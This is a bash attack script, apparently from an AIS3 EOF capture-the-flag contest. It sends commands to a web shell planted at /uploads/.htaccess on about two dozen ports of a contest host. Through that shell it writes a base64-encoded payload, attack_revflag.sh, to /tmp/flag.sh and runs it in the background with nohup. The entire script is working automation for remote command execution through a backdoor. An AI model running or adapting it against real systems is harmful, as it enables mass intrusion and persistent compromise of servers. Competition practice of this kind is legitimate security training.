#!/bin/bash

for j in 1 `seq 18 42`
do
	i=$(( $j + 30000 ))
	curl 'http://chals2.eof.ais3.org:'$i'/uploads/.htaccess' -F 'p=seadog007test1234' -F 'w=echo '$(sed 's/%id%/'$j'/g' attack_revflag.sh | base64 | tr -d '\n')' | base64 -d > /tmp/flag.sh'
curl 'http://chals2.eof.ais3.org:'$i'/uploads/.htaccess' -F 'p=seadog007test1234' -F 'w=nohup bash /tmp/flag.sh &' --connect-timeout 1 &
done
